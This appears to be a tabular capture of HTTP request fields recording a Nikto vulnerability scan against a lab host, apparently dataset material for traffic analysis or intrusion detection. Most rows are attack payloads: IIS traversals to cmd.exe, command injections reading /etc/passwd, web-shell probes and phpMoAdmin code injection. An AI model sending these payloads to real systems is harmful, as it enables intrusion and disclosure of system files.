http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
																	Keep-Alive										192.168.1.101									923						1	http://192.168.1.101/web/_vti_bin/..%c0%af../..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c+dir		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003199)				/web/_vti_bin/..%c0%af../..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c+dir
																	Keep-Alive										192.168.1.101															1	http://192.168.1.101/web/admin/system.php3?cmd=cat%20/etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003216)				/web/admin/system.php3?cmd=cat%20/etc/passwd
																	Keep-Alive										192.168.1.101									928						1	http://192.168.1.101/web/admin/system.php3?cmd=dir%20c:\\		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003217)				/web/admin/system.php3?cmd=dir%20c:\\
																	Keep-Alive										192.168.1.101									930						1	http://192.168.1.101/web/admin/exec.php3?cmd=cat%20/etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003218)				/web/admin/exec.php3?cmd=cat%20/etc/passwd
																	Keep-Alive										192.168.1.101									932						1	http://192.168.1.101/web/admin/exec.php3?cmd=dir%20c:\\		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003219)				/web/admin/exec.php3?cmd=dir%20c:\\
																	Keep-Alive										192.168.1.101									934						1	http://192.168.1.101/web/isapi/tstisapi.dll		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003263)				/web/isapi/tstisapi.dll
																	Keep-Alive										192.168.1.101									936						1	http://192.168.1.101/web/certsrv/..%255cwinnt/system32/cmd.exe?/c+dir		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003294)				/web/certsrv/..%255cwinnt/system32/cmd.exe?/c+dir
																	Keep-Alive										192.168.1.101									938						1	http://192.168.1.101/web/cgi-bin/..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003295)				/web/cgi-bin/..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir
																	Keep-Alive										192.168.1.101									940						1	http://192.168.1.101/web/iisadmpwd/..%255c..%255cwinnt/system32/cmd.exe?/c+dir		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003296)				/web/iisadmpwd/..%255c..%255cwinnt/system32/cmd.exe?/c+dir
																	Keep-Alive										192.168.1.101									942						1	http://192.168.1.101/web/msadc/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003297)				/web/msadc/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir
																	Keep-Alive										192.168.1.101									944						1	http://192.168.1.101/web/pbserver/..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003298)				/web/pbserver/..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir
																	Keep-Alive										192.168.1.101									946						1	http://192.168.1.101/web/rpc/..%255c..%255cwinnt/system32/cmd.exe?/c+dir		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003299)				/web/rpc/..%255c..%255cwinnt/system32/cmd.exe?/c+dir
																	Keep-Alive										192.168.1.101									948						1	http://192.168.1.101/web/scripts/..%255c..%255cwinnt/system32/cmd.exe?/c+dir		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003300)				/web/scripts/..%255c..%255cwinnt/system32/cmd.exe?/c+dir
																	Keep-Alive										192.168.1.101									950						1	http://192.168.1.101/web/scripts/..%255c..%255cwinnt/system32/cmd.exe?/c+ver		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003301)				/web/scripts/..%255c..%255cwinnt/system32/cmd.exe?/c+ver
																	Keep-Alive										192.168.1.101									952						1	http://192.168.1.101/web/_vti_bin/..%255c..%255c..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003302)				/web/_vti_bin/..%255c..%255c..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir
																	Keep-Alive										192.168.1.101									953						1	http://192.168.1.101/web/ans.pl?p=../../../../../usr/bin/id|&blah		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003370)				/web/ans.pl?p=../../../../../usr/bin/id|&blah
																	Keep-Alive										192.168.1.101									954						1	http://192.168.1.101/web/ans/ans.pl?p=../../../../../usr/bin/id|&blah		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003371)				/web/ans/ans.pl?p=../../../../../usr/bin/id|&blah
																	Keep-Alive										192.168.1.101									955						1	http://192.168.1.101/web/reports/rwservlet?server=repserv+report=/tmp/hacker.rdf+destype=cache+desformat=PDF		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003437)				/web/reports/rwservlet?server=repserv+report=/tmp/hacker.rdf+destype=cache+desformat=PDF
																	Keep-Alive										192.168.1.101									956						1	http://192.168.1.101/web/open.txt		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:006448)				/web/open.txt
																	Keep-Alive										192.168.1.101									957						1	http://192.168.1.101/web/fx29id1.txt		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:006449)				/web/fx29id1.txt
																	Keep-Alive										192.168.1.101									958						1	http://192.168.1.101/web/fx29id2.txt		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:006450)				/web/fx29id2.txt
																	Keep-Alive										192.168.1.101									959						1	http://192.168.1.101/web/?-s		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:006523)				/web/?-s
																	Keep-Alive										192.168.1.101									960						1	http://192.168.1.101/web/login.php?-s		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:006524)				/web/login.php?-s
																	Keep-Alive										192.168.1.101									962						1	http://192.168.1.101/web/3rdparty/phpMyAdmin/server_sync.php?c=phpinfo()		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:006608)				/web/3rdparty/phpMyAdmin/server_sync.php?c=phpinfo()
																	Keep-Alive										192.168.1.101									963						1	http://192.168.1.101/web/phpMyAdmin/server_sync.php?c=phpinfo()		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:006608)				/web/phpMyAdmin/server_sync.php?c=phpinfo()
																	Keep-Alive										192.168.1.101									964						1	http://192.168.1.101/web/3rdparty/phpmyadmin/server_sync.php?c=phpinfo()		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:006608)				/web/3rdparty/phpmyadmin/server_sync.php?c=phpinfo()
																	Keep-Alive										192.168.1.101									965						1	http://192.168.1.101/web/phpmyadmin/server_sync.php?c=phpinfo()		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:006608)				/web/phpmyadmin/server_sync.php?c=phpinfo()
																	Keep-Alive										192.168.1.101									966						1	http://192.168.1.101/web/pma/server_sync.php?c=phpinfo()		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:006608)				/web/pma/server_sync.php?c=phpinfo()
																	Keep-Alive										192.168.1.101									967						1	http://192.168.1.101/web/c99.php		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:006739)				/web/c99.php
																	Keep-Alive										192.168.1.101									968						1	http://192.168.1.101/web/awcuser/cgi-bin/vcs?xsl=/vcs/vcs_home.xsl%26cat%20%22/etc/passwd%22%26		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:006994)				/web/awcuser/cgi-bin/vcs?xsl=/vcs/vcs_home.xsl%26cat%20%22/etc/passwd%22%26
																	Keep-Alive										192.168.1.101									969						1	http://192.168.1.101/web/script		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:006999)				/web/script
																	Keep-Alive										192.168.1.101									970						1	http://192.168.1.101/web/jenkins/script		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:006999)				/web/jenkins/script
																	Keep-Alive										192.168.1.101									971						1	http://192.168.1.101/web/hudson/script		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:006999)				/web/hudson/script
																	Keep-Alive		44	44	application/x-www-form-urlencoded						192.168.1.101									972						1	http://192.168.1.101/web/axis2-admin/login		POST				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007004)				/web/axis2-admin/login
																	Keep-Alive		44	44	application/x-www-form-urlencoded						192.168.1.101									973						1	http://192.168.1.101/web/axis/axis2-admin/login		POST				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007004)				/web/axis/axis2-admin/login
																	Keep-Alive		44	44	application/x-www-form-urlencoded						192.168.1.101									974						1	http://192.168.1.101/web/axis2/axis2-admin/login		POST				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007004)				/web/axis2/axis2-admin/login
																	Keep-Alive		44	44	application/x-www-form-urlencoded						192.168.1.101									975						1	http://192.168.1.101/web/imcws/axis2-admin/login		POST				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007004)				/web/imcws/axis2-admin/login
																	Keep-Alive		44	44	application/x-www-form-urlencoded						192.168.1.101									976						1	http://192.168.1.101/web/WebServiceImpl/axis2-admin/login		POST				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007004)				/web/WebServiceImpl/axis2-admin/login
																	Keep-Alive		44	44	application/x-www-form-urlencoded						192.168.1.101									977						1	http://192.168.1.101/web/dswsbobje/axis2-admin/login		POST				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007004)				/web/dswsbobje/axis2-admin/login
																	Keep-Alive		44	44	application/x-www-form-urlencoded						192.168.1.101									978						1	http://192.168.1.101/web/ws/axis2-admin/login		POST				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007004)				/web/ws/axis2-admin/login
																	Keep-Alive		22	22	application/x-www-form-urlencoded						192.168.1.101									979						1	http://192.168.1.101/web/moadmin.php		POST				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007010)				/web/moadmin.php
																	Keep-Alive		22	22	application/x-www-form-urlencoded						192.168.1.101									980						1	http://192.168.1.101/web/phpmoadmin/moadmin.php		POST				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007010)				/web/phpmoadmin/moadmin.php
																	Keep-Alive		22	22	application/x-www-form-urlencoded						192.168.1.101									981						1	http://192.168.1.101/web/wu-moadmin/moadmin.php		POST				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007010)				/web/wu-moadmin/moadmin.php
																	Keep-Alive		22	22	application/x-www-form-urlencoded						192.168.1.101									982						1	http://192.168.1.101/web/moadmin/moadmin.php		POST				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007010)				/web/moadmin/moadmin.php
																	Keep-Alive		22	22	application/x-www-form-urlencoded						192.168.1.101									983						1	http://192.168.1.101/web/wu-moadmin.php		POST				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007010)				/web/wu-moadmin.php
																	Keep-Alive		22	22	application/x-www-form-urlencoded						192.168.1.101									984						1	http://192.168.1.101/web/phpmoadmin/wu-moadmin.php		POST				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007010)				/web/phpmoadmin/wu-moadmin.php
																	Keep-Alive		22	22	application/x-www-form-urlencoded						192.168.1.101									985						1	http://192.168.1.101/web/wu-moadmin/wu-moadmin.php		POST				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007010)				/web/wu-moadmin/wu-moadmin.php
																	Keep-Alive		22	22	application/x-www-form-urlencoded						192.168.1.101									986						1	http://192.168.1.101/web/moadmin/wu-moadmin.php		POST				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007010)				/web/moadmin/wu-moadmin.php
																	Keep-Alive		22	22	application/x-www-form-urlencoded						192.168.1.101									987						1	http://192.168.1.101/web/moadmin.php		POST				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007010)				/web/moadmin.php
																	Keep-Alive		22	22	application/x-www-form-urlencoded						192.168.1.101									988						1	http://192.168.1.101/web/wu-moadmin.php		POST				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007010)				/web/wu-moadmin.php
																	Keep-Alive		22	22	application/x-www-form-urlencoded						192.168.1.101									989						1	http://192.168.1.101/web/phpmoadmin/moadmin.php		POST				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007010)				/web/phpmoadmin/moadmin.php
																	Keep-Alive		22	22	application/x-www-form-urlencoded						192.168.1.101									990						1	http://192.168.1.101/web/phpmoadmin/wu-moadmin.php		POST				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007010)				/web/phpmoadmin/wu-moadmin.php
																	Keep-Alive		22	22	application/x-www-form-urlencoded						192.168.1.101									991						1	http://192.168.1.101/web/wu-moadmin/moadmin.php		POST				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007010)				/web/wu-moadmin/moadmin.php
																	Keep-Alive		22	22	application/x-www-form-urlencoded						192.168.1.101									992						1	http://192.168.1.101/web/wu-moadmin/wu-moadmin.php		POST				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007010)				/web/wu-moadmin/wu-moadmin.php
																	Keep-Alive		22	22	application/x-www-form-urlencoded						192.168.1.101									993						1	http://192.168.1.101/web/moadmin/moadmin.php		POST				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007010)				/web/moadmin/moadmin.php
																	Keep-Alive		22	22	application/x-www-form-urlencoded						192.168.1.101									994						1	http://192.168.1.101/web/moadmin/wu-moadmin.php		POST				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007010)				/web/moadmin/wu-moadmin.php
																	Keep-Alive		22	22	application/x-www-form-urlencoded						192.168.1.101									995						1	http://192.168.1.101/web/moadmin.php?collection=secpulse&action=listRows&find=array();phpinfo();exit;		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007011)				/web/moadmin.php?collection=secpulse&action=listRows&find=array();phpinfo();exit;
																	Keep-Alive		22	22	application/x-www-form-urlencoded						192.168.1.101									996						1	http://192.168.1.101/web/phpmoadmin/moadmin.php?collection=secpulse&action=listRows&find=array();phpinfo();exit;		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007011)				/web/phpmoadmin/moadmin.php?collection=secpulse&action=listRows&find=array();phpinfo();exit;
																	Keep-Alive		22	22	application/x-www-form-urlencoded						192.168.1.101									997						1	http://192.168.1.101/web/wu-moadmin/moadmin.php?collection=secpulse&action=listRows&find=array();phpinfo();exit;		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007011)				/web/wu-moadmin/moadmin.php?collection=secpulse&action=listRows&find=array();phpinfo();exit;
																	Keep-Alive		22	22	application/x-www-form-urlencoded						192.168.1.101									998						1	http://192.168.1.101/web/moadmin/moadmin.php?collection=secpulse&action=listRows&find=array();phpinfo();exit;		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007011)				/web/moadmin/moadmin.php?collection=secpulse&action=listRows&find=array();phpinfo();exit;
																	Keep-Alive		22	22	application/x-www-form-urlencoded						192.168.1.101									999						1	http://192.168.1.101/web/wu-moadmin.php?collection=secpulse&action=listRows&find=array();phpinfo();exit;		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007011)				/web/wu-moadmin.php?collection=secpulse&action=listRows&find=array();phpinfo();exit;
																	Keep-Alive		22	22	application/x-www-form-urlencoded						192.168.1.101									1000						1	http://192.168.1.101/web/phpmoadmin/wu-moadmin.php?collection=secpulse&action=listRows&find=array();phpinfo();exit;		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007011)				/web/phpmoadmin/wu-moadmin.php?collection=secpulse&action=listRows&find=array();phpinfo();exit;
																	Keep-Alive		22	22	application/x-www-form-urlencoded						192.168.1.101									1001						1	http://192.168.1.101/web/wu-moadmin/wu-moadmin.php?collection=secpulse&action=listRows&find=array();phpinfo();exit;		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007011)				/web/wu-moadmin/wu-moadmin.php?collection=secpulse&action=listRows&find=array();phpinfo();exit;
																	Keep-Alive		22	22	application/x-www-form-urlencoded						192.168.1.101									1002						1	http://192.168.1.101/web/moadmin/wu-moadmin.php?collection=secpulse&action=listRows&find=array();phpinfo();exit;		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007011)				/web/moadmin/wu-moadmin.php?collection=secpulse&action=listRows&find=array();phpinfo();exit;
																	Keep-Alive		22	22	application/x-www-form-urlencoded						192.168.1.101									1003						1	http://192.168.1.101/web/moadmin.php?collection=secpulse&action=listRows&find=array();phpinfo();exit;		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007011)				/web/moadmin.php?collection=secpulse&action=listRows&find=array();phpinfo();exit;
																	Keep-Alive		22	22	application/x-www-form-urlencoded						192.168.1.101									1004						1	http://192.168.1.101/web/wu-moadmin.php?collection=secpulse&action=listRows&find=array();phpinfo();exit;		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007011)				/web/wu-moadmin.php?collection=secpulse&action=listRows&find=array();phpinfo();exit;
																	Keep-Alive		22	22	application/x-www-form-urlencoded						192.168.1.101									1005						1	http://192.168.1.101/web/phpmoadmin/moadmin.php?collection=secpulse&action=listRows&find=array();phpinfo();exit;		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007011)				/web/phpmoadmin/moadmin.php?collection=secpulse&action=listRows&find=array();phpinfo();exit;
																	Keep-Alive		22	22	application/x-www-form-urlencoded						192.168.1.101									1006						1	http://192.168.1.101/web/phpmoadmin/wu-moadmin.php?collection=secpulse&action=listRows&find=array();phpinfo();exit;		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007011)				/web/phpmoadmin/wu-moadmin.php?collection=secpulse&action=listRows&find=array();phpinfo();exit;
																	Keep-Alive		22	22	application/x-www-form-urlencoded						192.168.1.101									1007						1	http://192.168.1.101/web/wu-moadmin/moadmin.php?collection=secpulse&action=listRows&find=array();phpinfo();exit;		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007011)				/web/wu-moadmin/moadmin.php?collection=secpulse&action=listRows&find=array();phpinfo();exit;
																	Keep-Alive		22	22	application/x-www-form-urlencoded						192.168.1.101									1008						1	http://192.168.1.101/web/wu-moadmin/wu-moadmin.php?collection=secpulse&action=listRows&find=array();phpinfo();exit;		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007011)				/web/wu-moadmin/wu-moadmin.php?collection=secpulse&action=listRows&find=array();phpinfo();exit;
																	Keep-Alive		22	22	application/x-www-form-urlencoded						192.168.1.101									1009						1	http://192.168.1.101/web/moadmin/moadmin.php?collection=secpulse&action=listRows&find=array();phpinfo();exit;		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007011)				/web/moadmin/moadmin.php?collection=secpulse&action=listRows&find=array();phpinfo();exit;
